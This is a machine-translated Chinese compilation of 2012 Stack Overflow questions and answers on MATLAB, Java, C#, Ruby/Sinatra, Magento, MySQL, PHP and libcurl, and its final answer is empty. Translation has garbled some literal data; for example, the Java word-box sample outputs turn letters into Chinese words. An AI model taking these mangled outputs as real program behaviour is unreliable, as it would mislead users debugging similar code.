要合并数据，我想加载一个数据作为基础，将数据分配给另一个变量（例如，将其命名为 base_data）。然后加载另一个数据并循环遍历其所有字段。如果基础数据中不存在当前字段，则将该字段添加到基础数据中。（例如 base_data.fieldname = data.fieldname）。然后我想将 base_data 保存到文件中。我可以知道在 Matlab 中执行此操作的命令吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:35:49.777

使用动态字段名称：

```
base_data = load('A.mat');
B = load('B.mat');
fn = fieldnames(B);
for ii=1:length(fn)
    fieldname = char(fn(ii));
    if ~isfield(base_data,fieldname)
        base_data.(fieldname) = B.(fieldname);
    end
end
save('base_data','base_data') 
```

# java - 嵌套循环未正确输出

> ID：13537220
> 
> 赞同：0
> 
> 时间：2012-11-24T00:30:34.050
> 
> 标签：java, loops, nested-loops

对于我目前正在研究的实验室，它可以帮助我：

```
output = ""
output += word

loop i that runs 
{
output += word.charAt(i)

loop j
{    
  output += " "

}

output += word.charAt( ______ )+ "\n"
}

StringBuffer sb = new StringBuffer(word);

output += word backwards 
```

这是我现在的代码：

```
import static java.lang.System.*;

class BoxWord
{
 private String word;

public BoxWord()
{
    word="";
}

public BoxWord(String s)
{
    word = s;
}

public void setWord(String w)
{
    word = w;
}

public String toString()
{
    String output="";
    output += word + "\n";
    for(int i =1; i<word.length(); i++)
    {
        output += word.charAt(i);
        for(int j =i+1; j<word.length()-i; j++)
        {
            output += " ";
        }
        output += word.charAt((word.length()-i)) + "\n";
    }
    StringBuffer sb = new StringBuffer(word);
    output += sb;

    return output+"\n";
}
} 
```

这是我用于交叉引用的跑步者类：

```
import static java.lang.System.*;

import java.util.Scanner;

public class Lab11f
{
 public static void main( String args[] )
   {
   Scanner keyboard = new Scanner(System.in);
    String choice="";
        do{
            out.print("Enter the word for the box : ");
            String value = keyboard.next();

                //instantiate a BoxWord object
         BoxWord bw = new BoxWord(value );
            //call the toString method to print the triangle
            System.out.println( bw );

            System.out.print("Do you want to enter more data? ");
            choice=keyboard.next();
        }while(choice.equals("Y")||choice.equals("y"));
}
} 
```

目前它的输出是这样的：

> 正方形
> 
> q
> 
> 你的
> 
> 啊
> 
> 汝
> 
> 情商
> 
> 正方形

当它需要是这样的：

> 正方形
> 
> Q>>>>R
> 
> 你>>>>一个
> 
> 一个>>>>U
> 
> 右>>>>问
> 
> ERAUQS（其中“>”表示空格，最后一列应对齐）

这是实验室表的 google 文档版本的链接：[https ://docs.google.com/open?id=0B_ifaCiEZgtcVTAtT2t0ajRPLUE](https://docs.google.com/open?id=0B_ifaCiEZgtcVTAtT2t0ajRPLUE)

**更新**：

好的，这在大多数情况下都有效。我现在得到这个：

> 正方形
> 
> q>>>>e
> 
> 你>>>>r
> 
> 一个>>>>一个
> 
> r>>>>u
> 
> e>>>>q
> 
> 正方形

**更新#2** 现在我的结果是这样的：

> 正方形
> 
> q>>>>e
> 
> 你>>>>r
> 
> 一个>>>>一个
> 
> r>>>>u
> 
> 时代

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:55:30.383

您的问题在第二个循环中。您想添加等于`word.length - 2`.

```
for(int j = 0; j < word.length()-2; j++)
{
     output += " ";
} 
```

代替

```
for(int j =i+1; j<word.length()-i; j++)
{
     output += " ";
} 
```

**编辑：**
没有看到你得到了太多。并且底部正方形没有反转。

```
for(int i =1; i<word.length()-1; i++) // -1 so the last letter is not added
{
    output += word.charAt(i);
    for(int j =i+1; j<word.length()-i; j++)
    {
        output += " ";
    }
    output += word.charAt((word.length()-i-1)) + "\n";
} 
```

要反转字符串，您必须使用`StringBuffer.reverse()`

```
output += sb.reverse(); 
```

# c# - 控制器中的 MVC3 绑定验证

> ID：13537223
> 
> 赞同：0
> 
> 时间：2012-11-24T00:31:04.970
> 
> 标签：c#, asp.net-mvc-3

我在谷歌上花了很多时间，但找不到答案。

而不是在模型类中有一个属性，比如

```
public class MyModel
{
   [Required]
   public string Name {get; set;}
} 
```

我可以在控制器中添加必需的要求而不是属性吗？

我期待类似 ValidationProvider.Add(一些模型属性，一些约束) 以前有人做过吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:23:17.877

是的，你可以（在控制器方法中）：

```
if(string.IsNullOrWhiteSpace(model.Name))
  ModelState.AddModelError("Name", "Name is required");

if(!ModelState.IsValid)
  return View(); 
```

但实际上你应该使用属性，或者`IValidatableObject`在你的模型类上实现。把东西很好地分开。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:13:14.093

如果您可以使用 HTML5，您可以在字段本身（在视图中）使用 required 属性。还要考虑 .Net 的 FluentValidation (http://fluentvalidation.codeplex.com/)。或者您可以使用 knockoutjs 框架来控制必填字段。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T08:47:34.423

您不应该这样做，因为如果这样做，数据层将不需要该属性，并且不会有相应的数据库约束。

# ios - 5.1 sim 中的 openWithCompletionHandler 概率

> ID：13537225
> 
> 赞同：4
> 
> 时间：2012-11-24T00:31:18.323
> 
> 标签：ios, xcode, uidocument

我很困惑。我发现 UIDocument 方法 openWithCompletionHandler 适用于 iOS 5 和 IOS 6 模拟程序，但不适用于 iOS 5.1。

关于我如何解决这个问题的任何想法？这只是模拟失败但真实环境没有的事情之一吗？

谢谢。

史蒂夫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-03T02:04:36.483

我看到类似的东西。在`openWithCompletionHandler`完成处理程序中永远不会被调用。在`saveToURL`中，应用程序完全冻结。至于你，这只发生在 5.1 模拟器中。5.0 和现在的 6.1 都很好。

# https - Sinatra 与 WebBrick 和 OpenSSL / HTTPS 与 Rack::Auth::Basic

> ID：13537228
> 
> 赞同：0
> 
> 时间：2012-11-24T00:32:58.823
> 
> 标签：https, openssl, sinatra, yaml, rack

我已阅读有关创建 OpenSSL 证书以及让 Webbrick 服务器运行它和 Sinatra 的教程和文档。这一切都有效 - 并且感谢之前的帖子。但是，现在我尝试将其与我的应用程序集成，我似乎丢失了解析请求并允许我从凭据中提取经过身份验证的用户名的“之前”代码。所以，我的基本问题是 - 如何同时使用 Rack::Auth::Basic 和 HTTPS，同时 WebBrick 与 Sinatra 一起运行。对此的任何帮助将不胜感激。

```
#!/usr/local/bin/ruby
require 'sinatra'
require 'webrick'
require 'webrick/https'
require 'openssl'

require 'yaml'

# basic authentication provided through Rack:Auth
configure do
  puts "configure do ran"
  # load password file - might move to DB at some point
  @@config = YAML.load_file(File.join(Dir.pwd, 'config', 'users.yml'))  
  use Rack::Auth::Basic, "Restricted Area" do |u, p|
    puts "use Rack::Auth::Basic"
    [u, p] == [u, @@config[:users][u][:password]]
  end
end

before do
  puts "before do ran"
  @auth ||=  Rack::Auth::Basic::Request.new(request.env)
  puts "auth username: " + @auth.username.to_s
  # set the user name for processing  in the post or get
  @myuser = @auth.username.to_s
end

class MyServer  < Sinatra::Base
  get '/' do
    # code would do something with @myuser here
    "Hello, world!"
  end       
end

pkey = cert = cert_name = nil

begin
  pkey = OpenSSL::PKey::RSA.new(File.open("private_key.pem").read)
  cert = OpenSSL::X509::Certificate.new(File.open("certificate.pem").read)
end

webrick_options = {
    :Port               => 8443,
    :Logger             => WEBrick::Log::new($stderr, WEBrick::Log::DEBUG),
    :DocumentRoot       => "/ruby/htdocs",
    :SSLEnable          => true,
    :SSLVerifyClient    => OpenSSL::SSL::VERIFY_NONE,
    :SSLCertificate     => cert,
    :SSLPrivateKey      => pkey,
    :SSLCertName        => [ [ "CN",WEBrick::Utils::getservername ] ],
    :app                  => MyServer
}

Rack::Server.start webrick_options 
```

再次，非常感谢您对此的任何想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T10:46:42.987

如上面的评论所示，以下似乎工作正常。

```
class MyServer  < Sinatra::Base
  # basic authentication provided through Rack:Auth
  configure do
    puts "Configure do ran"

    # require SSL
    use Rack::SslEnforcer 
    set :session_secret, 'asdfa2342923422f1adc05c837fa234230e3594b93824b00e930ab0fb94b'

    use Rack::Session::Cookie, :key => '_rack_session',
                       :path => '/',
                       :expire_after => 2592000, # In seconds
                       :secret => session_secret

    # load password file - might move to DB at some point
    @@config = YAML.load_file(File.join(Dir.pwd, 'config', 'users.yml'))  
    use Rack::Auth::Basic, "Restricted Area" do |u, p|
      puts "use Rack::Auth::Basic"
      [u, p] == [u, @@config[:users][u][:password]]
    end
  end

  before do
    puts "Before do ran"
    @auth ||=  Rack::Auth::Basic::Request.new(request.env)
    puts "auth username: " + @auth.username.to_s
    # set the user name for processing  in the post or get
    @myuser = @auth.username.to_s
  end

  get '/' do
    # code would do something with @myuser here
    "Hello, world!"
  end
end 
```

# php - 致命错误：在非对象上调用成员函数 getData()

> ID：13537233
> 
> 赞同：2
> 
> 时间：2012-11-24T00:33:51.293
> 
> 标签：php, javascript, html, zend-framework, magento

我想就我在 Magento 遇到的这个错误寻求一些帮助

致命错误：在第 163 行的 /Applications/MAMP/htdocs/mysite/app/code/local/Mage/Catalog/Helper/Image.php 中的非对象上调用成员函数 getData()

我创建了一个 CMS 页面并使用以下代码添加了一个 template.phtml 文件：

```
{{block type="core/template" product_id="177" template="page/thumbnails.phtml"}} 
```

模板文件使用产品 ID 显示产品图像和缩略图。当我将代码放在 view.phtml 中时，代码可以工作，但是当我将它添加到 CMS 页面时，我得到了错误，我只是不知道为什么？

我真的很感激一些帮助...

thumbnails.phtml 的代码：

```
 <?php
    $_product = $this->getProduct();
    $_helper = $this->helper('catalog/output');
    $_gallery = $this->getGalleryImages();
    $_resize = 265;
    ?>
    <style type="text/css">
    .product-img-box .more-views li.slide-current a{ border:2px solid #aaa; }
    .product-img-box .product-image-zoom img { cursor: pointer; }
    #slide-loader{ visibility:hidden; position:absolute; top:auto; left:auto; right:2px;      bottom:2px; width: 25px; height: 25px; }
</style>
<p class="product-image-zoom">
    <?php
        $_img = '<img id="image" src="'.$this->helper('catalog/image')->init($_product, 'image')->resize($_resize).'" alt="'.$this->htmlEscape($this->getImageLabel()).'" title="'.$this->htmlEscape($this->getImageLabel()).'" onclick="popWin(\''.$this->getGalleryUrl().'.\', \'gallery\', \'width=300,height=300,left=50,top=50,location=no,status=yes,scrollbars=yes,resizable=yes\'); return false;" />';
        echo $_helper->productAttribute($_product, $_img, 'image')
    ?>
    <img id="slide-loader" src="<?php echo $this->getSkinUrl('images/opc-ajax-loader.gif') ?>" />
</p>
<p class="a-center" id="track_hint"><?php echo $this->__('Click on above image to view full picture') ?></p>

<?php if (count($_gallery) > 0): ?>
<div class="more-views">
    <h4><?php echo $this->__('More Views') ?></h4>
    <ul>
    <?php foreach ($_gallery as $_image): ?>
        <li>
            <a href="<?php echo $this->helper('catalog/image')->init($this->getProduct(), 'image', $_image->getFile()); ?>" onclick="slide('<?php echo $this->helper('catalog/image')->init($this->getProduct(), 'image', $_image->getFile())->resize($_resize) ?>',<?php echo ($s = isset($s) ? ++$s : 0) ?>,'<?php echo $this->getGalleryUrl($_image) ?>'); return false;"><img src="<?php echo $this->helper('catalog/image')->init($this->getProduct(), 'thumbnail', $_image->getFile())->resize(56); ?>" alt="<?php echo $this->htmlEscape($_image->getLabel()) ?>" title="<?php echo $this->htmlEscape($_image->getLabel()) ?>" /></a>
        </li>
    <?php endforeach; ?>
    </ul>
</div>
<?php endif; ?>
<script type="text/javascript">
function slide(url,num,gallery){
    if (typeof slide.loading == 'undefined') slide.loading = false;
    if(slide.loading) return false;

    var loader = new Image();
    $(loader).observe('load', function(){

        $('slide-loader').setStyle({'visibility':'hidden'});

        $$('div.more-views li').each(function(el,i){
            (i==num) ? el.addClassName('slide-current') : el.removeClassName('slide-current');
        });

        var dummy = new Element('img', { src: url }).setOpacity(0);
        new Insertion.After('image', dummy);
        new Effect.Opacity(dummy, { duration:.5, from:0, to:1.0 });
        new Effect.Opacity($('image'), { duration:.5, from:1.0, to:0, 
             afterFinish: function(){
                 $('image').writeAttribute('src',url).setOpacity(1).observe('click',function(e){
                     Event.stop(e);
                     popWin(gallery, 'gallery', 'width=300,height=300,left=50,top=50,location=no,status=yes,scrollbars=yes,resizable=yes'); 
                     return false;
                 })
                 dummy.remove();
                 slide.loading = false;
             }
        });
    });

    $('slide-loader').setStyle({'visibility':'visible'});
    loader.src=url;
    slide.loading = true;
return false;
});
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:51:48.157

当在 view.phtml 中使用此代码时，您的块类将不是核心/模板，因此诸如“$this->getImageLabel()”之类的引用将导致您描述的错误。

要亲自查看此问题，请将其添加到 view.phtml 和 thumbnails.phtml 的顶部

```
echo get_class($this); 
```

然后您可以更新您的内联静态块类型。根据记忆，它可能是目录/产品，但一旦你完成了上面的建议，你就可以很容易地弄清楚这一点。

```
{{block type="catalog/product" product_id="177" template="page/thumbnails.phtml"}} 
```

# php - 即使使用 DISTINCT，MYSQL 也会加入重复的结果

> ID：13537235
> 
> 赞同：3
> 
> 时间：2012-11-24T00:33:56.943
> 
> 标签：php, mysql, database, join, duplicates

我有 2 个 mysql 表，一个称为“用户”，另一个称为“连接”

表用户有关于用户的信息，并且有 3 行：

```
mikha
guy
maricela 
```

表连接有 twitter 等用户之间的连接（例如 mikha 关注 maricela 和 maricela 关注 mikha）

Connections 具有以下行：

```
username1     | username2
--------------------------
guy           | maricela
mikha         | guy
mikha         | maricela 
```

我想获取有关“mikha”的信息，包括他关注的人数和关注他的人数。

我使用以下查询：

```
SELECT *, COUNT(DISTINCT  connections.username1) AS count_following, 
   COUNT(DISTINCT connections.username2)  AS count_followers 
FROM users LEFT JOIN connections on connections.username1 = 'mikha' OR  
   connections.username2 = 'mikha' WHERE users.username = 'mikha' 
```

预期的：

```
count_following = 2 (as mikha is following guy and maricela)
count_followers = 0 (no one following mikha yet) 
```

实际的：

```
count_following = 2
count_followers = 1 
```

谢谢问候迈克尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:44:36.447

您可以运行两个不同的查询（[fiddle here](http://sqlfiddle.com/#!2/59b0e/2)）：

```
select
  (select count(*) from connections
  where username1 = 'mikha') following,
  (select count(*) from connections
  where username2 = 'mikha') followers 
```

或者只是使用这个（[小提琴here](http://sqlfiddle.com/#!2/59b0e/1)）：

```
select
    sum(username1 = 'mikha') following,
    sum(username2 = 'mikha') followers
from connections 
```

我认为第二个应该更快。一旦你得到它，只需加入你的用户表，以防你需要来自该表的额外信息（根据你的例子，你不需要）。

# php - PHP 扩展至 5.3.15

> ID：13537236
> 
> 赞同：-1
> 
> 时间：2012-11-24T00:34:01.780
> 
> 标签：php, search

5.3.15 版本

我正在寻找这样的扩展名（.dll 文件）：

1.  php_intl.dll
2.  php_apc.dll

在这个版本下。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:46:46.027

那里也有存档...

[http://windows.php.net/downloads/releases/archives/php-5.3.15-nts-Win32-VC9-x86.zip](http://windows.php.net/downloads/releases/archives/php-5.3.15-nts-Win32-VC9-x86.zip)

以前版本的完整列表：

[http://windows.php.net/downloads/releases/archives/](http://windows.php.net/downloads/releases/archives/)

# java - 违反了 WAS 7.0 JVMVRFY013 类加载约束

> ID：13537237
> 
> 赞同：0
> 
> 时间：2012-11-24T00:34:22.280
> 
> 标签：java, web-services, axis, websphere-7

我有一个关于 WAS 7.0 类加载约束问题的问题我在 Stackoverflow（从你的 pom 中排除 xmlbeans jar）看到了一个与我的问题类似的解决方案但是这个解决方案对我不起作用。我认为我的问题不同

```
`com.ibm.ws.webcontainer.webapp.WebApp logServletError SRVE0293E: [Servlet Error]-[project]: java.lang.VerifyError JVMVRFY013 class loading constraint violated; class=org/apache/axis/message/NodeImpl, method=getParentNode()Lorg/w3c/dom/Node;, pc=0
at java.lang.J9VMInternals.verifyImpl(Native Method)
at java.lang.J9VMInternals.verify(J9VMInternals.java:72)
at java.lang.J9VMInternals.verify(J9VMInternals.java:70)
at java.lang.J9VMInternals.verify(J9VMInternals.java:70)
at java.lang.J9VMInternals.verify(J9VMInternals.java:70)
at java.lang.J9VMInternals.initialize(J9VMInternals.java:134)
at org.apache.axis.client.Call.invoke(Call.java:2364)
at org.apache.axis.client.Call.invoke(Call.java:1812)
at service.MyserviceStub.getFirstRequest(MyserviceStub.java:350)
at org.springframework.web.servlet.mvc.AbstractController.handleRequest(AbstractController.java:153)
at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48)
at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:859)
at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:793)
at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:476)
at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:441)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:738)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:831)
at com.ibm.ws.webcontainer.servlet.ServletWrapper.service(ServletWrapper.java:1657)
at com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:939)
at com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:502)
at com.ibm.ws.webcontainer.servlet.ServletWrapperImpl.handleRequest(ServletWrapperImpl.java:181)
at com.ibm.ws.webcontainer.webapp.WebApp.handleRequest(WebApp.java:3935)
at com.ibm.ws.webcontainer.webapp.WebGroup.handleRequest(WebGroup.java:276)
at com.ibm.ws.webcontainer.WebContainer.handleRequest(WebContainer.java:931)
at com.ibm.ws.webcontainer.WSWebContainer.handleRequest(WSWebContainer.java:1592)
at com.ibm.ws.webcontainer.channel.WCChannelLink.ready(WCChannelLink.java:186)
at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleDiscrimination(HttpInboundLink.java:452)
at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleNewRequest(HttpInboundLink.java:511)
at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.processRequest(HttpInboundLink.java:305)
at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.ready(HttpInboundLink.java:276)
at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.sendToDiscriminators(NewConnectionInitialReadCallback.java:214)
at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.complete(NewConnectionInitialReadCallback.java:113)
at com.ibm.ws.tcp.channel.impl.AioReadCompletionListener.futureCompleted(AioReadCompletionListener.java:165)
at com.ibm.io.async.AbstractAsyncFuture.invokeCallback(AbstractAsyncFuture.java:217)
at com.ibm.io.async.AsyncChannelFuture.fireCompletionActions(AsyncChannelFuture.java:161)
at com.ibm.io.async.AsyncFuture.completed(AsyncFuture.java:138)
at com.ibm.io.async.ResultHandler.complete(ResultHandler.java:204)
at com.ibm.io.async.ResultHandler.runEventProcessingLoop(ResultHandler.java:775)
at com.ibm.io.async.ResultHandler$2.run(ResultHandler.java:905)
at com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1613)
` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-09-19T13:09:57.360

IBM 网站有描述您的问题的[支持页面。](http://www-01.ibm.com/support/docview.wss?uid=nas8N1011249)

# php - PHP：喜欢/不喜欢计数器

> ID：13537239
> 
> 赞同：3
> 
> 时间：2012-11-24T00:34:50.053
> 
> 标签：php, mysql

我有一个漫画网站，我想允许用户为每部漫画和每件艺术品投票**一次。**

我的代码似乎有两个问题：

1）我只希望一个用户对每张图像投票一次......所以我想捕获他们的信息并将其存储在数据库中。我有一个 ON DUPLICATE KEY UPDATE，但它给了我以下语法错误，即使我没有发现它有任何问题：

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'table = VALUES(table), imgid = VALUES(imgid)' at line 7 
```

一个允许同一 IP 进入数据库的多个条目的示例：

![在此处输入图像描述](../Images/f3ecdd4fa30730606659de2e42f4e3c7.png)

2）它仍然允许一个用户多次投票。

```
 $sql = "SELECT ip FROM votes WHERE ip = \"".$_SERVER['REMOTE_ADDR']."\" AND table_name = $table AND imgid = $imgid";

$result = $mysqli->query($sql);
var_dump($result); 
```

**完整代码：**

```
<?php 
include 'dbconnect.php';
$site = $_GET['_site'];
$imgid = intval($_GET['_id']);
$input = $_GET['_choice'];

if ($site == "artwork") {
   $table = "artwork";
}
else {
   $table = "comics";
}

$result = $mysqli->query("SELECT like_count, dislike_count FROM $table WHERE id = $imgid");

list($likes, $dislikes) = $result->fetch_array(MYSQLI_NUM);

$sql = "INSERT INTO 
            votes (ip, table_name, imgid) 
        VALUES 
            (\"".$_SERVER['REMOTE_ADDR']."\", \"$table\", $imgid)
        ON DUPLICATE KEY UPDATE
            ip = VALUES(ip),
            table = VALUES(table),
            imgid = VALUES(imgid)";

$mysqli->query($sql);
echo $mysqli->error;
echo "<br/>";

$sql = "SELECT ip FROM votes WHERE ip = '".$_SERVER['REMOTE_ADDR']."' AND table_name = '$table' AND imgid = $imgid";

$result = $mysqli->query($sql);
echo $mysqli->error;

if ($result->num_rows == 0) { 
    if ($input == "like") {
        $sql = "UPDATE $table SET like_count = like_count + 1 WHERE id = $imgid";
        $mysqli->query($sql);           
        $likes++;
    }
    else if ($input == "dislike") {
        $sql = "UPDATE $table SET dislike_count = dislike_count + 1 WHERE id = $imgid";
        $mysqli->query($sql);
        $dislikes++;        
    }
echo "Likes: " . $likes . ", Dislikes: " . $dislikes;
}
else {
    echo "You have already voted";
}
mysqli_close($mysqli);

?> 
```

回显sql：

```
echo "sql: ". $sql; 
```

产生：

```
sql: INSERT INTO votes (ip, table_name, imgid) VALUES ("127.0.0.1", "comics", 34) ON DUPLICATE KEY UPDATE ip = VALUES(ip), table = VALUES(table), imgid = VALUES(imgid) 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T06:42:02.213

您看到的是`table`MySQL[保留字](https://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)之一，但您正试图将其用作列名。不过，您的专栏实际上是`table_name`根据您的问题调用的。

带有占位符的查询如下所示：

```
INSERT INTO votes (ip, table_name, imgid) 
  VALUES (?, ?, ?)
  ON DUPLICATE KEY UPDATE
    ip=VALUES(ip),
    table_name= VALUES(table_name),
    imgid=VALUES(imgid) 
```

请记住，`mysqli`您可以通过以下方式执行此查询：

```
$sth = $mysqli->prepare("...");
$sth->bind_param("sss", $_SERVER['REMOTE_ADDR'], $table, $imgid);
$sth->execute(); 
```

文档对这个过程进行了更详细的描述，但是`"sss"`thing指的是三个字符串，三个值作为参数传入。

您可能应该使用[PDO](http://net.tutsplus.com/tutorials/php/why-you-should-be-using-phps-pdo-for-database-access/)，因为它比`mysqli`. 更好的是使用像[Doctrine](http://www.doctrine-project.org/)这样的数据库框架来为你做很多 SQL 脏工作。更好的是使用像[CodeIgnighter](http://codeignighter.com/)、[CakePHP](http://cakephp.org/)或[FuelPHP](http://fuelphp.com/)这样的框架来为您提供构建基础。从头开始手动构建应用程序非常耗时并且更容易出错。

要注意的另一件事是，您应该尝试在代码中使用一致的命名。您将其`$table`称为 的值`table_name`，因此它应该是`$table_name`从开始的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:36:14.903

您查询失败但您没有检查并尝试使用 $result 但它不是对象错误`false`。它失败了，因为你应该是这样的：

```
$sql = "SELECT ip FROM votes WHERE ip = '".$_SERVER['REMOTE_ADDR']."' AND table_name = $table AND imgid = $imgid"; 
```

（字符串值用单引号引起来`'`）

# c++ - libcurl/cURL c++ 段错误

> ID：13537244
> 
> 赞同：3
> 
> 时间：2012-11-24T00:35:53.357
> 
> 标签：c++, curl

我正在尝试编写一个类以使用 cURL 从 C++ 网站获取一些数据。这是该类的一个示例（有一个 Curl* curl_ 数据成员， rawData_ 是一个字符串）。这段摘自实现文件，所有函数都在头文件中声明。

```
MyClass::MyClass()
{
    curl_global_init(CURL_GLOBAL_ALL);
    curl_ = curl_easy_init();

    curl_easy_setopt(curl_, CURLOPT_URL,
               "http://www.google.com");
    curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, &MyClass::writeCallback);

}

MyClass::~MyClass()
{
    curl_easy_cleanup(curl_);
    curl_global_cleanup();
}

size_t MyClass::writeCallback(char* buf, size_t size, size_t nmemb, void* up)
{
    //buf is a pointer to the data that curl has for us
    //size*nmemb is the size of the buffer
    for (size_t c = 0; c<size*nmemb; ++c)
    {
        cerr << c << endl;
        rawData_.push_back(buf[c]);
    }
    return size*nmemb; //tell curl how many bytes we handled
}

void MyClass::makeCall()
{
    curl_easy_perform(curl_);
} 
```

当我创建 MyClass 的实例并调用 makeCall 时，writeCallBack 函数中有一个段错误。也就是说，buf 的大小似乎为 0（当 c = 0 时，它在 buf[c] 的调用中中断）。任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T01:11:44.727

`curl_easy_setopt`with的参数`CURLOPT_WRITEFUNCTION`应该是类型`size_t function( char *ptr, size_t size, size_t nmemb, void *userdata)`。那是一个“干净”的 C 函数，而不是一种方法。

但据我所知，您传递的是非静态方法的地址。所以它不会有正确的签名（我猜它是非静态的，因为你在`rawData_`里面使用）。

现在，`curl_easy_setopt`真的不在乎 - 它需要你给它的任何东西。但是当它调用这个函数时，坏事就会发生。

我的建议是声明`writeCallback`为静态（甚至作为非成员朋友）并将用户数据设置为`this`（使用`curl_easy_setopt`with `CURLOPT_WRITEDATA`）。然后，您可以将 userdata 参数转换为`MyClass`并在函数内使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:11:57.080

在解释的 libcurl 手册页`curl_easy_setopt`中`CURLOPT_WRITEFUNCTION`，它指出在某些情况下可能会以“零大小”调用回调，例如指示空响应。在这种情况下，至少 的乘积`size*nmemb`应该为零，因此您的循环永远不会使用空缓冲区进入，因此您应该在那里安全。

但是，它也将参数描述为`CURLOPT_WRITEFUNCTION`带有给定参数的*函数*，而不是 C++ 成员函数。很可能是`this`回调成员函数体内的隐式指针被解释为`buf`. 碰巧`this`（内部类状态）第一次在与您的崩溃相同的行上被取消引用：`rawData_.push_back(buf[c])`.

真的快，尝试将您的类成员函数回调转换为静态函数回调（即，不再是 的成员`MyClass`）。那应该行得通。然后，您可以将此函数用作`friend`to ，或者如果您在使用 设置回调时将适当的指针`MyClass`传递给选项，则可以代理对类成员函数的调用，从而允许您的静态非成员函数调用适当的 C++具有指向类对象的适当指针的类方法。`this``CURLOPT_WRITEDATA``curl_easy_setopt`

# c++ - 检索地图的密钥（斯坦福 C++ 库）

> ID：13537245
> 
> 赞同：0
> 
> 时间：2012-11-24T00:36:00.100
> 
> 标签：c++, map

我正在使用斯坦福图书馆的 Map 类型。而且我可以很容易地通过传递它来获取值`.get(key)`但是我突然想到，如果我也可以检索它，那将是有益`keys`的。有没有办法做到这一点？

根据它的文档： http: [//www.stanford.edu/class/cs106b/materials/cppdoc/Map-class.html](http://www.stanford.edu/class/cs106b/materials/cppdoc/Map-class.html)它没有这样的功能。但是还有另一种方法吗？

也许使用迭代器：`Map <string, int>::iterator`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:50:08.323

就在这里。尝试[`foreach`](http://www.stanford.edu/class/cs106b/materials/cppdoc/foreach.html)：

> 作为迭代映射时的简化，foreach 宏迭代键而不是键/值对。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:45:39.363

您的 map.h 包含一条评论：

```
Additional Map operations
 - Iteration using the range-based for statement, standard STL iterators, and the mapping function mapAll 
```

所以，我想你可以尝试使用迭代器进行迭代：

```
Map<string, int> :: iterator it;
for(it = m.begin(); it != m.end(); ++it){ // Here m is your Map variable.
       string key = it->first;
       //... do something
} 
```

# c# - “RNGCryptoServiceProvider 不包含 GetNonZeroBytes 的定义”

> ID：13537249
> 
> 赞同：2
> 
> 时间：2012-11-24T00:37:31.780
> 
> 标签：c#, windows-phone-7, compiler-errors

我有以下代码。作用是生成一个特定大小的随机ID。但是我不断收到一个错误消息

> 'System.Security.Cryptography.RNGCryptoServiceProvider' 不包含'GetNonZeroBytes' 的定义，并且找不到接受'System.Security.Cryptography.RNGCryptoServiceProvider' 类型的第一个参数的扩展方法'GetNonZeroBytes'（您是否缺少 using 指令或程序集参考）

我正在尝试在 .NET 中使用密码库，根据 msdn，这是可以在这种情况下使用的功能之一，但由于某种原因，我不断收到此错误。

任何人都可以帮忙吗？

```
using System;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Ink;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Shapes;
using System.Security.Cryptography;
using System.Text;

namespace ONeRESPONSEAPP
{
    public class IdGenerator
    {
        public static string GetUniqueKey(int maxSize)
        {
            char[] chars = new char[45];
            chars =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data = new byte[1];
            RNGCryptoServiceProvider identity= new RNGCryptoServiceProvider();
            identity.GetNonZeroBytes(data);
            data = new byte[maxSize];
            identity.GetNonZeroBytes(data);
            StringBuilder result = new StringBuilder(maxSize);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return result.ToString();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:54:30.303

